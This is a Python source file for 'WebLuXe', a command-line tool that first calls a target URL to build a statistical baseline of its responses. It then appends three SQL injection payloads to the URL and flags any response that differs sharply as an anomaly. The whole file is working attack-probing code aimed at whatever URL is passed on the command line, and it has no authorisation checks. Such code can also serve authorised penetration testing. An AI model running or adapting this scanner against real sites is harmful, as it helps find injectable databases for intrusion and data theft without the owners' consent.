import asyncio
import aiohttp
import time
import numpy as np
from scipy.stats import chi2
from sklearn.covariance import MinCovDet
from bs4 import BeautifulSoup
from collections import deque

class UI:
    C, G, Y, R, B, E = "\033[94m", "\033[92m", "\033[93m", "\033[91m", "\033[1m", "\033[0m"
    LOGO = f"""{C}{B}
__        __   _      ____  _            _  __
\ \      / /__| |__  / ___|| | ___   ___| |/ /
 \ \ /\ / / _ \ '_ \ \___ \| |/ _ \ / __| ' / 
  \ V  V /  __/ |_) | ___) | | (_) | (__| . \ 
   \_/\_/ \___|_.__/ |____/|_|\___/ \___|_|\_\\
{Y}              [ Web LuXe: High-Dimensional Robust Inference ]{E}
"""

class FeatureArchitect:
    @staticmethod
    def get_entropy(data):
        if not data: return 0
        probs = [data.count(c) / len(data) for c in set(data)]
        return -sum(np.log2(p) * p for p in probs)

    def extract(self, response_text, headers, metrics):
        soup = BeautifulSoup(response_text, 'html.parser')
        tags = [tag.name for tag in soup.find_all()]
        text_content = soup.get_text()

        vector = [
            len(response_text),
            self.get_entropy(response_text),
            len(tags),
            len(set(tags)),
            len(list(soup.descendants)),
            metrics.get('ttfb', 0),
            metrics.get('total', 0),
            len(headers),
            len(str(headers.keys())),
            len(soup.find_all('script')) / (len(tags)+1),
            len(soup.find_all('img')) / (len(tags)+1),
            len(soup.find_all('div')),
            len(soup.find_all('iframe')),
            np.log1p(len(response_text)),
            np.sqrt(metrics.get('total',0))
        ]
        return np.array(vector, dtype=float)

class RobustProbabilisticOracle:
    def __init__(self, dimension, alpha=0.025):
        self.dim = dimension
        self.alpha = alpha
        self.window = deque(maxlen=100)
        self.mcd = MinCovDet(support_fraction=0.8)
        self.mu = None
        self.inv_cov = None
        self.chi2_threshold = chi2.ppf(1 - alpha, df=dimension)

    def update_baseline(self):
        if len(self.window) < 30: return False
        data = np.array(self.window)
        try:
            self.mcd.fit(data)
            self.mu = self.mcd.location_
            self.inv_cov = np.linalg.pinv(self.mcd.covariance_)
            return True
        except: return False

    def calculate_mahalanobis(self, vector):
        if self.mu is None: return 0
        delta = vector - self.mu
        dist_sq = np.dot(np.dot(delta, self.inv_cov), delta.T)
        return np.sqrt(max(0, dist_sq))

    def get_confidence(self, dist):
        p_value = 1 - chi2.cdf(dist**2, df=self.dim)
        return (1 - p_value) * 100

class WebLuXe:
    def __init__(self, target):
        self.target = target
        self.architect = FeatureArchitect()
        self.oracle = RobustProbabilisticOracle(dimension=15)
        self.scheduler = deque(maxlen=10)

    async def fetch(self, session, payload=""):
        url = f"{self.target}{payload}"
        metrics = {}
        try:
            start_time = time.time()
            async with session.get(url, timeout=10) as resp:
                ttfb = time.time() - start_time
                text = await resp.text()
                total = time.time() - start_time
                metrics = {'ttfb': ttfb, 'total': total}
                return text, resp.headers, metrics
        except: return None, None, None

    async def launch(self):
        print(UI.LOGO)
        async with aiohttp.ClientSession() as session:
            print(f"{UI.C}[*] Phase 1: Robust Calibration (MCD-based)...{UI.E}")
            while len(self.oracle.window) < 50:
                text, headers, metrics = await self.fetch(session)
                if text:
                    vec = self.architect.extract(text, headers, metrics)
                    self.oracle.window.append(vec)
                    print(f"    Samples: {len(self.oracle.window)}/50", end='\r')
                await asyncio.sleep(0.1)

            self.oracle.update_baseline()
            print(f"\n{UI.G}[+] Baseline Stable. Chi2 Threshold: {self.oracle.chi2_threshold:.2f}{UI.E}")

            payloads = ["' AND 1=1--", "' OR '1'='2", "') OR (1=1"]
            print(f"{UI.C}[*] Phase 2: High-Dimensional Inference...{UI.E}")

            for p in payloads:
                text, headers, metrics = await self.fetch(session, p)
                if text:
                    vec = self.architect.extract(text, headers, metrics)
                    dist = self.oracle.calculate_mahalanobis(vec)
                    conf = self.oracle.get_confidence(dist)

                    is_anomaly = dist > np.sqrt(self.oracle.chi2_threshold)
                    status = f"{UI.R}ANOMALY DETECTED{UI.E}" if is_anomaly else f"{UI.G}STABLE{UI.E}"

                    print(f"{UI.Y}[>] Payload: {p:<15} {UI.E}| Dist: {dist:.2f} | Conf: {conf:.2f}% | {status}")

if __name__ == "__main__":
    import sys
    target_url = sys.argv[1] if len(sys.argv) > 1 else "http://example.com/api?id=1"
    engine = WebLuXe(target_url)
    asyncio.run(engine.launch())
